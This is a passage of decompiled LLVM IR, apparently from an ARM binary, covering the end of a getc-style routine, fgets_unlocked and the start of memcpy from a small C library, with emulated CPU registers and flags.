  %tmp26 = urem i16 %v2_17ea0, 2
  %v1_17eac = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_17eac
  %v4_17eb0 = and i32 %tmp22, 4
  %v5_17eb0 = add i32 %v4_17eb0, %v2_17ee0
  %v1_17eb4 = add i32 %v5_17eb0, 36
  %v2_17eb4 = inttoptr i32 %v1_17eb4 to i8*
  %v3_17eb4 = load i8, i8* %v2_17eb4, align 1
  %v4_17eb4 = zext i8 %v3_17eb4 to i32
  %v1_17eb8 = add nsw i32 %v3_17ea0, -1
  store i32 %v1_17eb8, i32* %r2.global-to-local, align 4
  store i32 %v4_17eb4, i32* %r0.global-to-local, align 4
  %v2_17ec4 = add i32 %v2_17ee0, 40
  %v3_17ec4 = inttoptr i32 %v2_17ec4 to i32*
  store i32 0, i32* %v3_17ec4, align 4
  %v0_17ec8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ec8 = trunc i32 %v0_17ec8 to i16
  %v2_17ec8 = load i32, i32* @r4, align 4
  %v3_17ec8 = inttoptr i32 %v2_17ec8 to i16*
  store i16 %v1_17ec8, i16* %v3_17ec8, align 2
  br label %dec_label_pc_17f6c

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ea0
  %v1_17ed0 = add i32 %v2_17ee0, 16
  %v1_17ed4 = inttoptr i32 %v1_17ed0 to i32*
  %v2_17ed4 = load i32, i32* %v1_17ed4, align 4
  store i32 %v2_17ed4, i32* @r1, align 4
  %v3_17ed4 = add i32 %v2_17ee0, 20
  %v4_17ed4 = inttoptr i32 %v3_17ed4 to i32*
  %v5_17ed4 = load i32, i32* %v4_17ed4, align 4
  %v9_17ed8 = icmp eq i32 %v5_17ed4, %v2_17ed4
  br i1 %v9_17ed8, label %dec_label_pc_17ee8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17ed0
  %v2_17edc = inttoptr i32 %v2_17ed4 to i8*
  %v3_17edc = load i8, i8* %v2_17edc, align 1
  %v4_17edc = zext i8 %v3_17edc to i32
  store i32 %v4_17edc, i32* %r0.global-to-local, align 4
  %v6_17edc = add i32 %v2_17ed4, 1
  store i32 %v6_17edc, i32* @r1, align 4
  store i32 %v6_17edc, i32* %v1_17ed4, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17ee8:                               ; preds = %dec_label_pc_17ed0
  %v1_17ee8 = add i32 %v2_17ee0, 4
  %v2_17ee8 = inttoptr i32 %v1_17ee8 to i32*
  %v3_17ee8 = load i32, i32* %v2_17ee8, align 4
  %v7_17eec = icmp eq i32 %v3_17ee8, -2
  br i1 %v7_17eec, label %.thread7, label %dec_label_pc_17f00

.thread7:                                         ; preds = %dec_label_pc_17ee8
  %v2_17ef0 = or i16 %v2_17ea0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17ef0, i16* %v1_17ea0, align 2
  br label %dec_label_pc_17f6c

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17ee8
  %v1_17f00 = and i32 %v3_17ea0, 768
  %v2_17f00 = icmp eq i32 %v1_17f00, 0
  br i1 %v2_17f00, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17f00
  %v1_17f08 = load i32, i32* @r5, align 4
  %v3_17f08 = add i32 %v1_17f08, 76
  %v4_17f08 = inttoptr i32 %v3_17f08 to i32*
  %v5_17f08 = load i32, i32* %v4_17f08, align 4
  store i32 %v5_17f08, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17f00, %bb23
  store i32 98064, i32* @lr, align 4
  %v1_17f0c = xor i1 %v2_17f00, true
  call void @__pseudo_cond_branch(i1 %v1_17f0c, i32 ptrtoint (i32* @global_var_17aa8.736 to i32))
  %v0_17f10 = load i32, i32* @r4, align 4
  %v1_17f10 = add i32 %v0_17f10, 8
  store i32 %v1_17f10, i32* %r2.global-to-local, align 4
  %v1_17f14 = inttoptr i32 %v1_17f10 to i32*
  %v2_17f14 = load i32, i32* %v1_17f14, align 4
  store i32 %v2_17f14, i32* %r2.global-to-local, align 4
  %v3_17f14 = add i32 %v0_17f10, 12
  %v4_17f14 = inttoptr i32 %v3_17f14 to i32*
  %v5_17f14 = load i32, i32* %v4_17f14, align 4
  %v9_17f18 = icmp eq i32 %v5_17f14, %v2_17f14
  br i1 %v9_17f18, label %dec_label_pc_17f4c, label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %.thread9
  %v2_17f20 = add i32 %v0_17f10, 24
  %v3_17f20 = inttoptr i32 %v2_17f20 to i32*
  store i32 %v2_17f14, i32* %v3_17f20, align 4
  %v0_17f24 = load i32, i32* @r4, align 4
  store i32 %v0_17f24, i32* %r0.global-to-local, align 4
  %v2_17f28 = call i32 @__stdio_rfill(i32 %v0_17f24)
  store i32 %v2_17f28, i32* %r0.global-to-local, align 4
  %v2_17f2c = icmp eq i32 %v2_17f28, 0
  br i1 %v2_17f2c, label %dec_label_pc_17f68, label %dec_label_pc_17f34

dec_label_pc_17f34:                               ; preds = %dec_label_pc_17f20
  %v0_17f34 = load i32, i32* @r4, align 4
  %v1_17f34 = add i32 %v0_17f34, 20
  %v2_17f34 = inttoptr i32 %v1_17f34 to i32*
  %v3_17f34 = load i32, i32* %v2_17f34, align 4
  %v2_17f38 = add i32 %v0_17f34, 24
  %v3_17f38 = inttoptr i32 %v2_17f38 to i32*
  store i32 %v3_17f34, i32* %v3_17f38, align 4
  %v0_17f3c = load i32, i32* @r4, align 4
  %v1_17f3c = add i32 %v0_17f3c, 16
  %v2_17f3c = inttoptr i32 %v1_17f3c to i32*
  %v3_17f3c = load i32, i32* %v2_17f3c, align 4
  %v1_17f40 = inttoptr i32 %v3_17f3c to i8*
  %v2_17f40 = load i8, i8* %v1_17f40, align 1
  %v3_17f40 = zext i8 %v2_17f40 to i32
  store i32 %v3_17f40, i32* %r0.global-to-local, align 4
  %v5_17f40 = add i32 %v3_17f3c, 1
  store i32 %v5_17f40, i32* %v2_17f3c, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17f4c:                               ; preds = %.thread9
  %v1_17f4c = inttoptr i32 %v0_17f10 to i16*
  store i32 %v0_17f10, i32* %r0.global-to-local, align 4
  %v2_17f50 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_17f50, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17f58 = call i32 @__stdio_READ(i16* %v1_17f4c, i32 %v2_17f50, i32 1)
  store i32 %v5_17f58, i32* %r0.global-to-local, align 4
  %v2_17f5c = icmp eq i32 %v5_17f58, 0
  br i1 %v2_17f5c, label %dec_label_pc_17f68, label %bb24

bb24:                                             ; preds = %dec_label_pc_17f4c
  %v4_17f60 = load i8, i8* %stack_var_-17, align 1
  %v5_17f60 = sext i8 %v4_17f60 to i32
  store i32 %v5_17f60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17f4c, %dec_label_pc_17e90, %dec_label_pc_17f20
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17f6c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17f34, %dec_label_pc_17eac, %dec_label_pc_17f68
  %v2_17f70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17f70, i32* @r4, align 4
  store i32 %v6_17e54, i32* @r5, align 4
  store i32 %v9_17e54, i32* @lr, align 4
  %v1_17f74 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17f74

; uselistorder directives
  uselistorder i32 %v2_17ed4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17ee0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17e58, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f6c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_17f68, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_17f80 = load i32, i32* @r6, align 4
  %v12_17f80 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17f84 = icmp eq i32 %arg2, 0
  store i1 %v2_17f84, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1800c, label %dec_label_pc_17ff4.preheader

dec_label_pc_17ff4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_17ff42 = add i32 %arg2, -1
  store i32 %v1_17ff42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_17ff48 = icmp eq i32 %arg2, 1
  store i1 %v7_17ff48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ff48, label %dec_label_pc_17ffc, label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %dec_label_pc_17ff4.preheader, %dec_label_pc_17ff4.backedge.dec_label_pc_17fa0_crit_edge
  %v0_17fc4 = phi i32 [ %v0_17fa0.pre, %dec_label_pc_17ff4.backedge.dec_label_pc_17fa0_crit_edge ], [ %arg3, %dec_label_pc_17ff4.preheader ]
  %v1_17fa0 = add i32 %v0_17fc4, 16
  %v2_17fa0 = inttoptr i32 %v1_17fa0 to i32*
  %v3_17fa0 = load i32, i32* %v2_17fa0, align 4
  store i32 %v3_17fa0, i32* %r2.global-to-local, align 4
  %v1_17fa4 = add i32 %v0_17fc4, 24
  %v2_17fa4 = inttoptr i32 %v1_17fa4 to i32*
  %v3_17fa4 = load i32, i32* %v2_17fa4, align 4
  store i32 %v3_17fa4, i32* %r3.global-to-local, align 4
  %v3_17fa8 = icmp uge i32 %v3_17fa0, %v3_17fa4
  store i1 %v3_17fa8, i1* %cpsr_c.global-to-local, align 1
  %v9_17fa8 = icmp eq i32 %v3_17fa0, %v3_17fa4
  store i1 %v9_17fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17fa8, label %dec_label_pc_17fc4, label %dec_label_pc_17fb0

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17fa0
  %v1_17fb0 = inttoptr i32 %v3_17fa0 to i8*
  %v2_17fb0 = load i8, i8* %v1_17fb0, align 1
  %v3_17fb0 = zext i8 %v2_17fb0 to i32
  store i32 %v3_17fb0, i32* %r3.global-to-local, align 4
  %v5_17fb0 = add i32 %v3_17fa0, 1
  store i32 %v5_17fb0, i32* %r2.global-to-local, align 4
  %v2_17fb4 = load i32, i32* @r5, align 4
  %v3_17fb4 = inttoptr i32 %v2_17fb4 to i8*
  store i8 %v2_17fb0, i8* %v3_17fb4, align 1
  %v4_17fb4 = load i32, i32* @r5, align 4
  %v5_17fb4 = add i32 %v4_17fb4, 1
  store i32 %v5_17fb4, i32* @r5, align 4
  %v0_17fb8 = load i32, i32* %r3.global-to-local, align 4
  %v2_17fb8 = icmp ugt i32 %v0_17fb8, 9
  store i1 %v2_17fb8, i1* %cpsr_c.global-to-local, align 1
  %v7_17fb8 = icmp eq i32 %v0_17fb8, 10
  store i1 %v7_17fb8, i1* %cpsr_z.global-to-local, align 1
  %v0_17fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_17fbc = load i32, i32* @r4, align 4
  %v2_17fbc = add i32 %v1_17fbc, 16
  %v3_17fbc = inttoptr i32 %v2_17fbc to i32*
  store i32 %v0_17fbc, i32* %v3_17fbc, align 4
  br i1 %v7_17fb8, label %dec_label_pc_17ffc, label %dec_label_pc_17ff4.backedge

dec_label_pc_17fc4:                               ; preds = %dec_label_pc_17fa0
  %v1_17fc4 = inttoptr i32 %v0_17fc4 to i16*
  %v3_17fc8 = call i32 @getc_unlocked(i16* %v1_17fc4)
  %v3_17fcc = icmp eq i32 %v3_17fc8, -1
  store i1 %v3_17fcc, i1* %cpsr_c.global-to-local, align 1
  %v8_17fcc = icmp eq i32 %v3_17fc8, -1
  store i1 %v8_17fcc, i1* %cpsr_z.global-to-local, align 1
  %v1_17fd0 = urem i32 %v3_17fc8, 256
  store i32 %v1_17fd0, i32* %r3.global-to-local, align 4
  br i1 %v3_17fcc, label %dec_label_pc_17fd8, label %dec_label_pc_17ff0

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fc4
  %v0_17fd8 = load i32, i32* @r4, align 4
  %v1_17fd8 = inttoptr i32 %v0_17fd8 to i16*
  %v2_17fd8 = load i16, i16* %v1_17fd8, align 2
  %v3_17fd8 = zext i16 %v2_17fd8 to i32
  store i32 %v3_17fd8, i32* %r3.global-to-local, align 4
  %v1_17fdc = and i32 %v3_17fd8, 8
  %v2_17fdc = icmp eq i32 %v1_17fdc, 0
  store i1 %v2_17fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fdc, label %dec_label_pc_17ffc, label %dec_label_pc_1800c

dec_label_pc_17ff0:                               ; preds = %dec_label_pc_17fc4
  %v1_17fe8 = trunc i32 %v3_17fc8 to i8
  %v2_17fe8 = load i32, i32* @r5, align 4
  %v3_17fe8 = inttoptr i32 %v2_17fe8 to i8*
  store i8 %v1_17fe8, i8* %v3_17fe8, align 1
  %v4_17fe8 = load i32, i32* @r5, align 4
  %v5_17fe8 = add i32 %v4_17fe8, 1
  store i32 %v5_17fe8, i32* @r5, align 4
  %v0_17fec = load i32, i32* %r3.global-to-local, align 4
  %v2_17fec = icmp ugt i32 %v0_17fec, 9
  store i1 %v2_17fec, i1* %cpsr_c.global-to-local, align 1
  %v7_17fec = icmp eq i32 %v0_17fec, 10
  store i1 %v7_17fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17fec, label %dec_label_pc_17ffc, label %dec_label_pc_17ff4.backedge

dec_label_pc_17ff4.backedge:                      ; preds = %dec_label_pc_17ff0, %dec_label_pc_17fb0
  %v0_17ff4 = load i32, i32* @r6, align 4
  %v1_17ff4 = add i32 %v0_17ff4, -1
  store i32 %v1_17ff4, i32* @r6, align 4
  %v2_17ff4 = icmp ne i32 %v0_17ff4, 0
  store i1 %v2_17ff4, i1* %cpsr_c.global-to-local, align 1
  %v7_17ff4 = icmp eq i32 %v0_17ff4, 1
  store i1 %v7_17ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ff4, label %dec_label_pc_17ffc, label %dec_label_pc_17ff4.backedge.dec_label_pc_17fa0_crit_edge

dec_label_pc_17ff4.backedge.dec_label_pc_17fa0_crit_edge: ; preds = %dec_label_pc_17ff4.backedge
  %v0_17fa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17ffc:                               ; preds = %dec_label_pc_17ff0, %dec_label_pc_17ff4.backedge, %dec_label_pc_17fb0, %dec_label_pc_17ff4.preheader, %dec_label_pc_17fd8
  %v0_17ffc = load i32, i32* @r5, align 4
  %v1_17ffc = load i32, i32* @r7, align 4
  %v3_17ffc = icmp uge i32 %v0_17ffc, %v1_17ffc
  store i1 %v3_17ffc, i1* %cpsr_c.global-to-local, align 1
  %v9_17ffc = icmp eq i32 %v0_17ffc, %v1_17ffc
  store i1 %v9_17ffc, i1* %cpsr_z.global-to-local, align 1
  %v2_18000 = xor i1 %v9_17ffc, true
  %v3_18000 = and i1 %v3_17ffc, %v2_18000
  br i1 %v3_18000, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_17ffc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18004 = inttoptr i32 %v0_17ffc to i8*
  store i8 0, i8* %v7_18004, align 1
  %v0_18008.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18008.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_17ffc, %bb
  %v1_18008 = phi i1 [ %v1_18008.pre, %bb ], [ %v9_17ffc, %dec_label_pc_17ffc ]
  %v0_18008 = phi i1 [ %v0_18008.pre, %bb ], [ %v3_17ffc, %dec_label_pc_17ffc ]
  %v2_18008 = xor i1 %v1_18008, true
  %v3_18008 = and i1 %v0_18008, %v2_18008
  br i1 %v3_18008, label %.dec_label_pc_18010_crit_edge, label %dec_label_pc_1800c

.dec_label_pc_18010_crit_edge:                    ; preds = %.thread14
  %v0_18010.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18010

dec_label_pc_1800c:                               ; preds = %entry, %dec_label_pc_17fd8, %.thread14
  br label %dec_label_pc_18010

dec_label_pc_18010:                               ; preds = %.dec_label_pc_18010_crit_edge, %dec_label_pc_1800c
  %v0_18010 = phi i32 [ %v0_18010.pre, %.dec_label_pc_18010_crit_edge ], [ 0, %dec_label_pc_1800c ]
  store i32 %v9_17f80, i32* @r6, align 4
  store i32 %v12_17f80, i32* @r7, align 4
  ret i32 %v0_18010

; uselistorder directives
  uselistorder i1 %v9_17ffc, { 1, 0, 2 }
  uselistorder i32 %v1_17ffc, { 1, 0 }
  uselistorder i32 %v0_17ffc, { 0, 2, 1 }
  uselistorder i32 %v0_17ff4, { 2, 0, 1 }
  uselistorder i32 %v0_17fec, { 1, 0 }
  uselistorder i32 %v3_17fc8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17fb8, { 1, 0 }
  uselistorder i32 %v3_17fa0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17fc4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18010, { 1, 0 }
  uselistorder label %dec_label_pc_1800c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_17ffc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17fa0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18020 = load i32, i32* @r1, align 4
  %v1_18020 = load i32, i32* @r0, align 4
  %v2_18020 = sub i32 %v0_18020, %v1_18020
  %v3_18020 = icmp ult i32 %v0_18020, %v1_18020
  %v4_18020 = xor i32 %v1_18020, %v0_18020
  %v5_18020 = xor i32 %v2_18020, %v0_18020
  %v6_18020 = and i32 %v5_18020, %v4_18020
  %v7_18020 = icmp slt i32 %v6_18020, 0
  store i1 %v7_18020, i1* %cpsr_v.global-to-local, align 1
  %v8_18020 = icmp slt i32 %v2_18020, 0
  store i1 %v8_18020, i1* %cpsr_n.global-to-local, align 1
  %v9_18020 = icmp eq i32 %v0_18020, %v1_18020
  store i1 %v9_18020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18020, label %dec_label_pc_18274, label %dec_label_pc_18028

dec_label_pc_18028:                               ; preds = %entry
  br i1 %v9_18020, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18028
  %merge = phi i32 [ %v0_18020, %dec_label_pc_18028 ], [ %v2_18308, %bb150 ], [ %v11_18324, %bb153 ], [ %v7_18324, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18028
  %v5_1802c = inttoptr i32 %v1_18020 to i8*
  store i8* %v5_1802c, i8** %stack_var_-8, align 4
  %v8_1802c = load i32, i32* @lr, align 4
  %v0_18030 = load i32, i32* @r2, align 4
  %v2_18030 = add i32 %v0_18030, -4
  store i32 %v2_18030, i32* %r2.global-to-local, align 4
  %v4_18030 = sub i32 3, %v0_18030
  %v5_18030 = and i32 %v4_18030, %v0_18030
  %v6_18030 = icmp slt i32 %v5_18030, 0
  store i1 %v6_18030, i1* %cpsr_v.global-to-local, align 1
  %v7_18030 = icmp slt i32 %v2_18030, 0
  store i1 %v7_18030, i1* %cpsr_n.global-to-local, align 1
  %v8_18030 = icmp eq i32 %v0_18030, 4
  store i1 %v8_18030, i1* %cpsr_z.global-to-local, align 1
  %v5_18034 = icmp slt i32 %v0_18030, 4
  br i1 %v5_18034, label %bb140, label %dec_label_pc_18038

dec_label_pc_18038:                               ; preds = %bb
  %v1_18038 = urem i32 %v1_18020, 4
  store i32 %v1_18038, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18038 = icmp eq i32 %v1_18038, 0
  store i1 %v2_18038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18038, label %dec_label_pc_18040, label %dec_label_pc_180ec

dec_label_pc_18040:                               ; preds = %dec_label_pc_18038
  %v1_18040 = urem i32 %v0_18020, 4
  store i32 %v1_18040, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18040 = icmp eq i32 %v1_18040, 0
  store i1 %v2_18040, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18020 to i2
  br i1 %v2_18040, label %dec_label_pc_18048, label %dec_label_pc_1811c

dec_label_pc_18048:                               ; preds = %dec_label_pc_18040, %dec_label_pc_18114
  %v0_1806094 = phi i32 [ %v1_18020, %dec_label_pc_18040 ], [ %v0_1823c77, %dec_label_pc_18114 ]
  %v0_1805c93 = phi i32 [ %v0_18020, %dec_label_pc_18040 ], [ %v0_18114, %dec_label_pc_18114 ]
  %v0_18048 = phi i32 [ %v2_18030, %dec_label_pc_18040 ], [ %v2_1810c, %dec_label_pc_18114 ]
  %v1_18048 = add i32 %v0_18048, -8
  store i32 %v1_18048, i32* %r2.global-to-local, align 4
  %v3_18048 = sub i32 7, %v0_18048
  %v4_18048 = and i32 %v3_18048, %v0_18048
  %v5_18048 = icmp slt i32 %v4_18048, 0
  store i1 %v5_18048, i1* %cpsr_v.global-to-local, align 1
  %v6_18048 = icmp slt i32 %v1_18048, 0
  store i1 %v6_18048, i1* %cpsr_n.global-to-local, align 1
  %v7_18048 = icmp eq i32 %v0_18048, 8
  store i1 %v7_18048, i1* %cpsr_z.global-to-local, align 1
  %v2_1804c = xor i1 %v6_18048, %v5_18048
  br i1 %v2_1804c, label %dec_label_pc_1809c, label %dec_label_pc_18050

dec_label_pc_18050:                               ; preds = %dec_label_pc_18048
  %v1_18050 = add i32 %v0_18048, -28
  store i32 %v1_18050, i32* %r2.global-to-local, align 4
  %v3_18050 = sub i32 27, %v0_18048
  %v4_18050 = and i32 %v3_18050, %v1_18048
  %v5_18050 = icmp slt i32 %v4_18050, 0
  store i1 %v5_18050, i1* %cpsr_v.global-to-local, align 1
  %v6_18050 = icmp slt i32 %v1_18050, 0
  store i1 %v6_18050, i1* %cpsr_n.global-to-local, align 1
  %v7_18050 = icmp eq i32 %v1_18048, 20
  store i1 %v7_18050, i1* %cpsr_z.global-to-local, align 1
  %v2_18054 = xor i1 %v6_18050, %v5_18050
  br i1 %v2_18054, label %dec_label_pc_18088, label %dec_label_pc_18058

dec_label_pc_18058:                               ; preds = %dec_label_pc_18050
  %v0_18058 = load i32, i32* @r4, align 4
  store i32 %v0_18058, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1805c

dec_label_pc_1805c:                               ; preds = %dec_label_pc_1805c.dec_label_pc_1805c_crit_edge, %dec_label_pc_18058
  %v0_18060 = phi i32 [ %v12_18068, %dec_label_pc_1805c.dec_label_pc_1805c_crit_edge ], [ %v0_1806094, %dec_label_pc_18058 ]
  %v0_1805c = phi i32 [ %v0_1805c.pre, %dec_label_pc_1805c.dec_label_pc_1805c_crit_edge ], [ %v0_1805c93, %dec_label_pc_18058 ]
  %v1_1805c = inttoptr i32 %v0_1805c to i32*
  %v2_1805c = load i32, i32* %v1_1805c, align 4
  %v3_1805c = add i32 %v0_1805c, 4
  %v4_1805c = inttoptr i32 %v3_1805c to i32*
  %v5_1805c = load i32, i32* %v4_1805c, align 4
  store i32 %v5_1805c, i32* %r4.global-to-local, align 4
  %v6_1805c = add i32 %v0_1805c, 8
  %v7_1805c = inttoptr i32 %v6_1805c to i32*
  %v8_1805c = load i32, i32* %v7_1805c, align 4
  store i32 %v8_1805c, i32* %ip.global-to-local, align 4
  %v9_1805c = add i32 %v0_1805c, 12
  %v10_1805c = inttoptr i32 %v9_1805c to i32*
  %v11_1805c = load i32, i32* %v10_1805c, align 4
  store i32 %v11_1805c, i32* %lr.global-to-local, align 4
  %v12_1805c = add i32 %v0_1805c, 16
  store i32 %v12_1805c, i32* %r1.global-to-local, align 4
  %v1_18060 = inttoptr i32 %v0_18060 to i32*
  store i32 %v2_1805c, i32* %v1_18060, align 4
  %v3_18060 = add i32 %v0_18060, 4
  %v4_18060 = inttoptr i32 %v3_18060 to i32*
  %v5_18060 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18060, i32* %v4_18060, align 4
  %v6_18060 = add i32 %v0_18060, 8
  %v7_18060 = inttoptr i32 %v6_18060 to i32*
  %v8_18060 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18060, i32* %v7_18060, align 4
  %v9_18060 = add i32 %v0_18060, 12
  %v10_18060 = inttoptr i32 %v9_18060 to i32*
  %v11_18060 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18060, i32* %v10_18060, align 4
  %v12_18060 = add i32 %v0_18060, 16
  store i32 %v12_18060, i32* %r0.global-to-local, align 4
  %v0_18064 = load i32, i32* %r1.global-to-local, align 4
  %v1_18064 = inttoptr i32 %v0_18064 to i32*
  %v2_18064 = load i32, i32* %v1_18064, align 4
  store i32 %v2_18064, i32* @r3, align 4
  %v3_18064 = add i32 %v0_18064, 4
  %v4_18064 = inttoptr i32 %v3_18064 to i32*
  %v5_18064 = load i32, i32* %v4_18064, align 4
  store i32 %v5_18064, i32* %r4.global-to-local, align 4
  %v6_18064 = add i32 %v0_18064, 8
  %v7_18064 = inttoptr i32 %v6_18064 to i32*
  %v8_18064 = load i32, i32* %v7_18064, align 4
  store i32 %v8_18064, i32* @ip, align 4
  %v9_18064 = add i32 %v0_18064, 12
  %v10_18064 = inttoptr i32 %v9_18064 to i32*
  %v11_18064 = load i32, i32* %v10_18064, align 4
  store i32 %v11_18064, i32* %lr.global-to-local, align 4
  %v12_18064 = add i32 %v0_18064, 16
  store i32 %v12_18064, i32* @r1, align 4
  %v1_18068 = inttoptr i32 %v12_18060 to i32*
  store i32 %v2_18064, i32* %v1_18068, align 4
  %v3_18068 = add i32 %v0_18060, 20
  %v4_18068 = inttoptr i32 %v3_18068 to i32*
  %v5_18068 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18068, i32* %v4_18068, align 4
  %v6_18068 = add i32 %v0_18060, 24
  %v7_18068 = inttoptr i32 %v6_18068 to i32*
  %v8_18068 = load i32, i32* @ip, align 4
  store i32 %v8_18068, i32* %v7_18068, align 4
  %v9_18068 = add i32 %v0_18060, 28
  %v10_18068 = inttoptr i32 %v9_18068 to i32*
  %v11_18068 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18068, i32* %v10_18068, align 4
  %v12_18068 = add i32 %v0_18060, 32
  store i32 %v12_18068, i32* @r0, align 4
  %v0_1806c = load i32, i32* %r2.global-to-local, align 4
  %v1_1806c = add i32 %v0_1806c, -32
  store i32 %v1_1806c, i32* %r2.global-to-local, align 4
  %v3_1806c = sub i32 31, %v0_1806c
  %v4_1806c = and i32 %v3_1806c, %v0_1806c
  %v5_1806c = icmp slt i32 %v4_1806c, 0
  %v6_1806c = icmp slt i32 %v1_1806c, 0
  %v2_18070 = xor i1 %v6_1806c, %v5_1806c
  br i1 %v2_18070, label %dec_label_pc_18074, label %dec_label_pc_1805c.dec_label_pc_1805c_crit_edge

dec_label_pc_1805c.dec_label_pc_1805c_crit_edge:  ; preds = %dec_label_pc_1805c
  %v0_1805c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1805c

dec_label_pc_18074:                               ; preds = %dec_label_pc_1805c
  %v1_18074 = add i32 %v0_1806c, -16
  %v3_18074 = add i32 %v0_1806c, 2147483616
  %v4_18074 = and i32 %v1_18074, %v3_18074
  %v5_18074 = icmp slt i32 %v4_18074, 0
  store i1 %v5_18074, i1* %cpsr_v.global-to-local, align 1
  %v6_18074 = icmp slt i32 %v1_18074, 0
  store i1 %v6_18074, i1* %cpsr_n.global-to-local, align 1
  %v7_18074 = icmp eq i32 %v1_18074, 0
  store i1 %v7_18074, i1* %cpsr_z.global-to-local, align 1
  %v2_18078 = xor i1 %v6_18074, %v5_18074
  br i1 %v2_18078, label %bb137, label %bb136

